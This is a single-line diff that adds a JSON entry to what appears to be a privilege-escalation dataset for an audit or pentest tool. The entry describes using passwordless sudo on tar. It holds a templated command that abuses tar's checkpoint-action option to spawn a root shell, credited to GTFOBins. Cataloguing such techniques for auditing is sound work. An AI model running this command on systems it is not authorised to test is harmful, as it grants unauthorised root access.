@@ -1,0 +1,1 @@
+{"id":"sudo_tar","category":"SUDO_NOPASSWD_CUSTOM","binary":"tar","cve":null,"exploitation":["sudo {{binary}} -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec={{shell}}"],"post_exploit":["id"],"source":"gtfobins.github.io","tags":["sudo","nopasswd","gtfobins"],"severity":"high"}
